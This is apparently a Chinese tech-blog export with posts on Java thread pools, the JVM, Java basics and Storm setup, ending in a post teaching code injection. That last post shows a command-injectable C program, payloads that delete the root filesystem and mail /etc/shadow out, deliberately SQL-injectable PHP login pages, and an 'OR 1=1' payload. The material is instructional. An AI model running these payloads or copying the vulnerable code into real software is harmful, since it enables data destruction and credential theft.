调度型线程池，调度型线程池会根据Scheduled(任务列表)进行延迟执行，或者是进行周期性的执行.适用于一些周期性的工作。 创建线程池 创建固定型线程 1ExecutorService service3 = Executors.newFixedThreadPool(10); 创建缓存型线程池 1ExecutorService service2 = Executors.newCacheThreadPool(); 创建调度型线程池 1ExecutorService service4 = Executors.newScheduledThreadPool(10); Future 介绍Future表示异步计算的结果，它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果。Future的cancel方法可以取消任务的执行，它有一布尔参数，参数为 true 表示立即中断任务的执行，参数为 false 表示允许正在运行的任务运行完成。Future的 get 方法等待计算完成，获取计算结果。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package com.reapal.brave.main;import java.util.concurrent.Callable;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.Future;public class CallableAndFuture &#123; public static class MyCallable implements Callable&#123; private int flag = 0; public MyCallable(int flag)&#123; this.flag = flag; &#125; public String call() throws Exception&#123; if (this.flag == 0)&#123; return "flag = 0"; &#125; if (this.flag == 1)&#123; try &#123; while (true) &#123; System.out.println("looping."); Thread.sleep(2000); &#125; &#125; catch (InterruptedException e) &#123; System.out.println("Interrupted"); &#125; return "false"; &#125; else &#123; throw new Exception("Bad flag value!"); &#125; &#125; &#125; public static void main(String[] args) &#123; MyCallable task1 = new MyCallable(0); MyCallable task2 = new MyCallable(1); MyCallable task3 = new MyCallable(2); ExecutorService es = Executors.newFixedThreadPool(3); try &#123; // 提交并执行任务，任务启动时返回了一个Future对象， // 如果想得到任务执行的结果或者是异常可对这个Future对象进行操作 Future future1 = es.submit(task1); // 获得第一个任务的结果，如果调用get方法，当前线程会等待任务执行完毕后才往下执行 System.out.println("task1: " + future1.get()); Future future2 = es.submit(task2); // 等待5秒后，再停止第二个任务。因为第二个任务进行的是无限循环 Thread.sleep(5000); System.out.println("task2 cancel: " + future2.cancel(true)); // 获取第三个任务的输出，因为执行第三个任务会引起异常 // 所以下面的语句将引起异常的抛出 Future future3 = es.submit(task3); System.out.println("task3: " + future3.get()); &#125; catch (Exception e)&#123; System.out.println(e.toString()); &#125; // 停止任务执行服务 es.shutdownNow(); &#125;&#125; execute与submit区别 接收的参数不一样 submit有返回值，而execute没有 submit方便Exception处理 execute是Executor接口中唯一定义的方法；submit是ExecutorService（该接口继承Executor）中定义的方法 关闭线程池 shutdown() : 不会立刻停止，只是表示停止接收任务，而等待线程池中正在执行的线程结束后，才关闭线程池 shutdownNow() : 立刻关闭线程池，包括不接受任务，线程池中正在执行的任务也立刻停止。 参考链接 https://www.jianshu.com/p/edd7cb4eafa0 https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Thread</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JVM 小记]]></title>
    <url>%2F2018%2F03%2F12%2FJVM%2F</url>
    <content type="text"><![CDATA[类加载机制JVM 的类加载是通过ClassLoader 及其子类完成的，加载分为三类加载 Bootstrap ClassLoader负责加载$JAVA_HOME中jre/lib/rt.jar里所有的class或者 -Xbootclasspath选项指定的jar包，rt.jar由C++实现，而不是ClassLoader子类 Extension ClassLoader负责加载Java平台中扩展功能的一些jar包，包括$JAVA_HOME中jre/lib/*.jar或-Djava.ext.dirs指定目录下的jar包 App ClassLoader负责加载classpath中指定的jar包及目录中的class Custom ClassLoader属于应用程序根据自身需要定义的ClassLoader，如Tomcat、jboss都会根据J2EE规范自行实现ClasLoader。 加载过程中会先检查类是否已加载，检查顺序是自Custom–&gt;Bootstrap，只要某个Classloader已加载就视为已加载此类，保证此类只加载一次，而加载的顺序是自Bootstrap–&gt;Custom 双亲委托模型未完待续。。。。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
        <tag>GC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 基础小记]]></title>
    <url>%2F2018%2F03%2F01%2FJava%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[static和final的区别和用途 Static 修饰变量:静态变量随着类的加载时完成初始化，内存中只有一个，且JVM也只会为他分配一次内存，所有类共享静态变量，静态变量放在指定的静态共享区，遵循一改全改。 修饰方法:静态方法在类加载时就存在与静态区域，不依赖任何实例，Static方法必须实现，不能是抽象类abstract。使用静态方法时可以直接使用类名.方法名,不需要实例化一个对象。 修饰代码块：类加载完后执行代码块中的内容。 Final 修饰变量： 编译时常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型。 运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的内容可以变。 修饰方法：跟final单词意思相近，最后的方法，表示不能被继承，不能被子类修改重写。 修饰类：不能被继承。 修饰形参：final形参在方法内不可变。 12345678910111213141516171819202122232425262728293031323334353637383940414243class Value &#123; int i = 1;&#125;public class FinalDemo &#123; static int i = 9; final int i1 = 9; static final int i2 = 29; public static final int i3 = 39; final int i4 = (int)(Math.random()*20); static final int i5 = (int)(Math.random()*20); Value v1 = new Value(); final Value v2 = new Value(); static final Value v3 = new Value(); // final Value v4; // Error: var not init in the default constructor final int[] a = &#123;1, 2, 3, 4, 5, 6 &#125;; public void print(String id) &#123; System.out.println(id + " : " + "i4 = " + i4 + ", i5 = " + i5 + ", i = " + i); &#125; public static void main(String[] args) &#123; FinalDemo finalDemo = new FinalDemo(); // finalDemo.i1++; // Error: can't change value finalDemo.v2.i++; FinalDemo.i++; finalDemo.v1 = new Value(); for (int i = 0; i &lt; finalDemo.a.length; i++) &#123; finalDemo.a[i]++; // finalDemo.v2 = new Value(); // Error: Can't // finalDemo.v3 = new Value(); // change handle // finalDemo.a = new int[3]; // Error: can't assign a value to final var &#125; finalDemo.print("fd1"); System.out.println("Creating new FinalDemo class"); FinalDemo finalDemo2 = new FinalDemo(); finalDemo.print("fd1"); finalDemo2.print("fd2"); &#125;&#125; 同步机制实现原子化 synchronized丢失更新(lost update) 有一种特定的过程。(1) 取得账户余额。int i = balance;(2) 将账户余额加1。balance = i + 1;这会让计算机以两个步骤来完成账户的变化。通常我们会以单一的命令来做这件事情:balance++;但强行以两个步骤来处理就会浮现出非原子性的问题。下面用两个都想把余额递增的线程来展示丢失更新。12345678910111213141516171819202122232425262728293031class TestSync implements Runnable &#123; private int balance; /** 每个线程都把账户递增50次 **/ @Override public void run() &#123; for(int i = 0; i &lt; 50; i++) &#123; increament(); System.out.println("balance is " + balance); &#125; &#125; private void increament() &#123; int i = balance; /** 问题出在我们用的是读取的值而不是目前的值 **/ balance = i + 1; &#125;&#125;public class TestSyncTest &#123; public static void main(String[] args) &#123; TestSync job = new TestSync(); Thread a = new Thread(job); Thread b = new Thread(job); a.start(); b.start(); &#125;&#125; 用同步机制让increment() 方法原子化，将increment()方法同步化可以解决丢失更新的问题，因为他会让方法中的两个步骤组成不可分割的单元。1234private synchronized void increment() &#123; int i = balance; balance = i + 1;&#125; 但同步化是需要付出额外的成本。也就是说进入同步化方法的程序会查询钥匙等性能上的损耗。其次，同步化的方法会让你的程序因为要同步并行的问题而慢下来。同步化会强制线程排队等待执行方法。最后，最可怕的是同步化可能会导致死锁现象。原则上最好制作最少量的同步化。事实上同步化的规模可以小于方法全部，可以用synchronized来修饰一行或数行的代码而不必整个方法都同步化。比如:12345678public void go() &#123; doStuff(); synchronized(this) &#123; criticalStuff(); moreCriticalStuff(); &#125;&#125; 并行问题也是线程安全的问题，对于一个类是否线程安全，重要的决定因素便是是否存在上面提及的问题，诸如HashMap和HashTable、StringBuffer和StringBuiler、Vector和ArrayList等的区别，其中HashMap、StringBuiler、ArrayList没有实现同步化，因此是非线程安全的；HashTable、StringBuffer、Vector在原本HashMap、StringBuiler、ArrayList的方法上添加了synchronized修饰来保证线程安全。 hashCode()与equals()的相关规定API文件有对对象的状态指定出必须遵守的规则： 如果两个对象相等，则hashcode必须也是相等的。 如果两个对象相等，对其中一个对象调用equals()必须返回true。也就是说，若a.equals(b)则b.equals(a)。 如果两个对象有相同的hashcode值，它们也不一定是相等的。但若两个对象相等，则hashcode值一定是相等的。 因此若equals()被覆盖过，则hashCode()也必须被覆盖。 hashCode()的默认行为是对在heap(堆)上的对象产生独特的值。如果你没有override过hashCode()，则该class的两个对象怎样都不会被认为是相同的。 equals()的默认行为是执行==的比较。也就是说会去测试两个引用是否对上heap上同一个对象。如果equals()没有被覆盖过，两个对象永远都不会被视为相同的，因为不同的对象有不同的字节组合。 a.equals(b)必须与a.hashCode() == b.hashCode()等值。但a.hashCode() == b.hashCode()不一定要与a.equals()等值。 问：为什么不同对象会有相同hashcode的可能答：HashSet使用hashcode来达成存取速度较快的存储方法。如果你尝试用对象来寻找ArrayList中相同的对象(也就是不用索引来找)，ArrayList会从头开始找起。但是HashSet这样找对象的速度就块多了，因为它使用hashcode来寻找符合条件的元素。因此当你想要寻找某个对象时，通过hashcode就可以很快算出该对象所在的位置，而不用从头一个一个找起。重点在于hashcode相同并不一定保证对象是相等的，因为hashCode()所使用的杂凑算法也许刚刚好会让多个对象传回相同的杂凑值。越糟糕的杂凑算法越容易碰撞，但这也与数据值域分布的特征有关。如果HashSet发现在对比的时候，同样的hashcode有多个对象，它会使用equals()来判断是否有完全的符合。也就是说，hashcode是用来缩小寻找成本，但最后还是要用equals()才能认定是否真的找到相同的项目。 这与加密中的问题一样，网络中将用户的密码获取后，通过加密算法将密码加密成一个固定长度的无规律字符串保存在数据库中，密码相同，肯定加密的结果是唯一相同的，但是由于加密过后是固定长度，比如32个字节，那么着32个字节就有固定的容量，因此会出现两个不同的密码加密后是一样的字符串。 对于上述第四条和第五条，个人的理解是：hashCode()方法原本是根据对象在内存中的位置来计算，因此如果要比较两个对象是否相等，通过原本的hashCode()方法计算会得到两个不同的值，因为是两个对象，原本的hashCode()是一个对象对应一个唯一的值，这个值与内存位置有关，而两个对象是在不同的内存位置上，如果强行想要表示这两个对象相等，就必须重写原本的hashCode()。 同样的，对于equals()方法，原本是表示两个引用所指向的对象是否是一个对象，但是我们需要按照自己的意愿去表示两个不同的对象，如果某些特征相同时也表示相等，比如想要表示一个人的信息，在不同时间点记录的信息会不同，但只要身份证号一样，我们就认为这是同一个人。这就需要重写equals()方法，让它表示两个不同对象在意义上相同。 综合上述的描述 : hashCode()是判断引用相等，equals()是判断对象相等。 Collection API 多线程Java实现多线程的方式 继承Thread类，重写run方法 实现Runable接口 实现Callable接口 启动多线程时，start()方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。从程序运行的结果可以发现，多线程程序是乱序执行。因此，只有乱序执行的代码才有必要设计为多线程。Thread.sleep()方法调用目的是不让当前线程独自霸占该进程所获取的CPU资源，以留出一定时间给其他线程执行的机会。实际上所有的多线程代码执行顺序都是不确定的，每次执行的结果都是随机的。 实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的。 三种方式的区别 实现Runable接口能增强程序的健壮性，代码能够被多个线程共享，代码与数据是独立的，适合多个相同程序代码的线程区处理同一资源。正如上述同步化所用的程序。 继承Thread类不适合资源共享，但继承Thread和实现Runable都是通过start()启动线程，然后JVM将线程放到就绪队列中，如果有处理机可用，则执行run方法。 实现Callable接口要实现call方法，并且线程执行完后是后返回值的，其他两种都没有返回值。 在java中，每次程序运行至少启动2个线程。一个是main线程，一个是垃圾收集线程。 线程状态 新建状态（New）：新创建了一个线程对象。 就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。 运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码 阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种： 等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。(wait会释放持有的锁) 同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。 其他阻塞：运行的线程执行sleep()或join()方法，或者发出了I/O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。（注意,sleep是不会释放持有的锁） 死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。 线程调度Java线程有优先级，优先级高的线程会获得较多的运行机会。 Java线程的优先级用整数表示，取值范围是1~10，Thread类有以下三个静态常量：123456static int MAX_PRIORITY 线程可以具有的最高优先级，取值为10。static int MIN_PRIORITY 线程可以具有的最低优先级，取值为1。static int NORM_PRIORITY 分配给线程的默认优先级，取值为5。 Thread类的setPriority()和getPriority()方法分别用来设置和获取线程的优先级。每个线程都有默认的优先级。主线程的默认优先级为Thread.NORM_PRIORITY。线程的优先级有继承关系，比如A线程中创建了B线程，那么B将和A具有相同的优先级。 常用的调度 线程睡眠：Thread.sleep(long millis)方法，使线程转到阻塞状态。millis参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。sleep不会释放持有的锁。 线程等待：Object类中的wait()方法，导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 唤醒方法。这两个唤醒方法也是Object类中的方法，行为等价于调用 wait(0) 一样。wait会释放持有的锁。 线程让步：Thread.yield() 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。 线程加入：join()方法，等待其他线程终止。在当前线程中调用另一个线程的join()方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。 线程唤醒：Object类中的notify()方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 wait 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个notifyAll()，唤醒在此对象监视器上等待的所有线程。 常用函数说明 sleep(long millis) : 运行–&gt;阻塞 ,在指定的毫秒数内让当前正在执行的线程休眠（暂停执行） join() : 运行–&gt;阻塞,在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。 yield() : 运行–&gt;可运行,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。 wait() : Obj.wait()，与Obj.notify()必须要与synchronized(Obj)一起使用，也就是wait,与notify是针对已经获取了Obj锁进行操作，从语法角度来说就是Obj.wait(),Obj.notify必须在synchronized(Obj){…}语句块内。从功能上来说wait就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的notify()唤醒该线程，才能继续获取对象锁，并继续执行。相应的notify()就是对对象锁的唤醒操作。但有一点需要注意的是notify()调用后，并不是马上就释放对象锁的，而是在相应的synchronized(){}语句块执行结束，自动释放锁后，JVM会在wait()对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep()与Object.wait()二者都可以暂停当前线程，释放CPU控制权，主要的区别在于Object.wait()在释放CPU同时，释放了对象锁的控制 wait()和notify() wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。 当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。 当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。 synchronized 和lock synchronized : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。 lock(ReentrantLock) : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。 Java中的BIO、NIO、AIO BIO(Blocking I/O) : 同步阻塞IO，服务器中一个连接一个线程，数据的读取和写入必须阻塞在一个线程内等待其完成。 NIO(New I/O) : 同步非阻塞IO，服务器中一个请求一个线程，客户端所有连接注册到多路复用器中，多路复用器轮询所有连接，当存在连接有IO请求时才启动一个线程去处理IO。 AIO(Asynchronous I/O) : 异步非阻塞IO，服务器中一个有效请求一个线程，没有多路复用器轮询，客户端有IO请求给服务器，服务器获得请求后，由OS处理请求，处理完成后，再通知服务器创建一个线程去处理IO结果。 具体理解请看这以及这 同步与异步同步与异步是针对应用程序与内核的交互而言的。同步过程中进程触发IO操作并等待或者轮询的去查看IO操作是否完成。异步过程中进程触发IO操作以后，直接返回，做自己的事情，IO交给内核来处理，完成后内核通知进程IO完成。 阻塞与非阻塞简单理解为需要做一件事能不能立即得到返回应答，如果不能立即获得返回，需要等待，那就阻塞了，否则就可以理解为非阻塞 参考这篇博客的图 未具体理解 匿名内部类匿名内部类也就是没有名字的内部类正因为没有名字，所以匿名内部类只能使用一次，它通常用来简化代码编写但使用匿名内部类还有个前提条件：必须继承一个父类或实现一个接口123456789101112public class AnonymousClass &#123; public static void main(String[] args) &#123; Runnable x = new Runnable() &#123; @Override public void run() &#123; System.out.println(this.getClass()); &#125; &#125;; x.run(); &#125;&#125; 匿名内部类的特征 匿名内部类没有访问修饰符(如public、private) 当所在方法的形参被匿名内部类使用时，这个行参必须final 匿名内部类没有构造方法，因为它连名字都没有 重点解释第二点:首先我们知道在内部类编译成功后，它会产生一个class文件，该class文件与外部类并不是同一class文件，仅仅只保留对外部类的引用。当外部类传入的参数需要被内部类调用时，从java程序的角度来看是直接被调用：1234567891011public class AnonymousClass &#123; public void anonyFinal(String name) &#123; Runnable x = new Runnable() &#123; @Override public void run() &#123; System.out.println(this.getClass() + " " + name); &#125; &#125;; x.run(); &#125;&#125; 从上面代码中看好像name参数应该是被内部类直接调用？其实不然，在java编译之后实际的操作如下：12345678public class AnonymousClass$InnerClass &#123; public InnerClass(String name) &#123; this.InnerClass$name = name; &#125; public void run() &#123; System.out.println(this.getClass() + " " + this.InnerClass$name); &#125;&#125; 从这里可以看出匿名内部类并不是直接调用行参，而是临时产生构造函数，并将行参引用赋给自己的内部变量，并调用内部变量。因此为了让程序员产生这样的直接调用错觉，规定行参必须是final不可更改的。 参考资料/相关链接 多线程 http://blog.csdn.net/evankaka/article/details/44153709 匿名内部类 http://blog.csdn.net/chenssy/article/details/13170015]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>static</tag>
        <tag>final</tag>
        <tag>synchronized</tag>
        <tag>hashCode</tag>
        <tag>equals</tag>
        <tag>Collection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Storm]]></title>
    <url>%2F2018%2F01%2F31%2Fstorm%2F</url>
    <content type="text"><![CDATA[安装zookeeper 安装过程查看文章http://fenlan.github.io/2017/11/29/zookeeper-kafka/ 安装Storm 官网下载Storm 配置storm/conf/storm.yaml 12345678910111213storm.zookeeper.servers: - "zookeeper-server1" - "zookeeper-server2" - "zookeeper-server3"nimbus.seeds: ["zookeeper-server1"]storm.local.dir: "/root/Downloads/storm/data"supervisor.slots.ports: - 6700 - 6701 - 6702 - 6703 每一项配置顶格需要一个空格，所有配置避免使用Tab 启动nohup bin/storm nimbus &amp; 启动nohup bin/storm supervisor &amp; 启动nohup bin/storm ui &amp; 查看ui: zookeeper-server1:8080 运行WordCount 下载maven : wget http://www-eu.apache.org/dist/maven/maven-3/3.5.2/binaries/apache-maven-3.5.2-bin.tar.gz tar -zxf apache-maven-3.5.2-bin.tar.gz 初始化安装storm所需依赖：mvn clean install -DskipTests=true 使用Maven打包storm拓扑：mvn package 运行WordCount : bin/storm jar storm-starter-1.1.1.jar org.apache.storm.starter.WordCountTopology wordcount]]></content>
      <categories>
        <category>流式计算</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>storm</tag>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码注入]]></title>
    <url>%2F2017%2F12%2F14%2F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[c程序代码注入c程序:123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; char src[100], dst[100], cmd[205] = "cp "; printf("Please enter name of source file:"); gets(src); strcat(cmd, src); strcat(cmd, " "); printf("Please enter name of destination file:"); gets(dst); strcat(cmd, dst); system(cmd); return 0;&#125; 程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行: 异常代码注入 同时还能干这些事情删除根目录，你可以试试1cp hello world; rm -rf / --no-preserve-root 将linux系统的密码文件通过邮件发送1cp hello world; mail ****@****.com &lt; /etc/shadow SQL代码注入index.html1234567891011121314151617181920212223&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;title&gt;sql 注入测试&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="card" style="width: 20rem;"&gt; &lt;div class="card-body"&gt; &lt;form method="POST" action="index.php"&gt; &lt;div class="form-group"&gt; &lt;label class="col-form-label" for="formGroupExampleInput"&gt;SQL query&lt;/label&gt; &lt;input type="text" class="form-control" name="content" id="content" placeholder="Example input"&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-primary"&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; index.php123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;title&gt;SQL 注入&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if ($_POST[content]) &#123; $db_host = "localhost"; $db_user = "my_user"; $db_password = "my_password"; $db_name = "my_db"; $content = $_POST[content]; $query = "SELECT * FROM users WHERE name = '$content'"; $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name); $result = mysqli_query($conn, $query); var_dump(); if (mysqli_num_rows($result)) &#123; while ($row = mysqli_fetch_array($result)) &#123; echo "Your name is " . $row[1] . "&lt;/br&gt;"; &#125; &#125; else &#123; echo "No Found!"; &#125; mysqli_close($conn); &#125; else &#123; var_dump($_POST); echo "Don't get your content!"; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 表中数据正常输入异常输入 问题在于SELECT * FROM users WHERE name = &#39;$content&#39;在接收前端输入的字符串时，直接拼接查询语句,当输入为hello&#39; OR 1=1 #时,将语句拼接完成就是SELECT * FROM users WHERE name = &#39;hello&#39; OR 1=1 #&#39;,其中hello后的一个单引号将查询语句的第一个单引号关闭了,接下来就是OR语句的真子句,最后将多余的单引号注释掉,那么这个查询永远为真,查询语句就会将数据库中所有的数据都返回。 SQL注入续low.php1234567891011121314151617181920212223242526272829&lt;?php$db_host = "localhost";$db_user = "my_user";$db_password = "my_password";$db_name = "my_db";$user = $_POST[ 'username' ];$pass = $_POST[ 'password' ];$pass = md5( $pass );$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);$result = mysqli_query($conn, $query);if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;";&#125;else &#123; echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";&#125;mysqli_close($conn);?&gt; medium.php12345678910111213141516171819202122232425262728293031&lt;?php$db_host = "localhost";$db_user = "my_user";$db_password = "my_password";$db_name = "my_db";$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);$user = $_POST[ 'username' ];$pass = $_POST[ 'password' ];$user = mysqli_real_escape_string($conn, $user);$pass = mysqli_real_escape_string($conn, $pass);$pass = md5( $pass );$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";$result = mysqli_query($conn, $query);if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;";&#125;else &#123; echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";&#125;mysqli_close($conn);?&gt; sql.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;title&gt;SQL 注入&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if ($_POST[content]) &#123; $db_host = "localhost"; $db_user = "my_user"; $db_password = "my_password"; $db_name = "my_db"; $content = $_POST[content]; $query = "SELECT first_name,last_name FROM users WHERE user_id = '$content'"; $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name); $result = mysqli_query($conn, $query); if (mysqli_num_rows($result)) &#123; while ($row = mysqli_fetch_array($result)) &#123; $first = $row["first_name"]; $last = $row["last_name"]; echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; &#125; else &#123; echo "No Found!"; &#125; mysqli_close($conn); &#125; else &#123; var_dump($_POST); echo "Don't get your content!"; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; user.html123456789101112131415161718192021222324252627282930313233&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" 